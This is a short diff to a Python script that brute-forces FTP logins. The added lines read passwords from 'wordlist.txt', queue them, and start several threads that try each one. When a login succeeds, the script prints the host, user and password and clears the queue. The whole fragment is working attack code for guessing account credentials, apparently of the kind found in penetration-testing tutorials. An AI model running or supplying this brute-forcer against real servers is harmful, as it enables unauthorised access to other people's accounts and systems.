@@ -26,3 +26,24 @@ def connect_ftp():
             print(f"\tHost: {host}")
             print(f"\tUser: {user}")
             print(f'\tPassword: {password}{Fore.RESET}')
+
+            #Clear the queue
+            with q.mutex:
+                q.queue.clear()
+                q.all_tasks_done.notify_all()
+                q.unfinished_tasks = 0
+        finally:
+            q.task_done()
+
+
+passwords = open('wordlist.txt').read().split('\n')
+print(f'[+] Passwrods to try: {len(passwords)}')
+
+for password in passwords:
+    q.put(password)
+for t in range(n_threads):
+    thread = Thread(target=connect_ftp)
+    thread.daemon = True
+    thread.start()
+
+q.join()
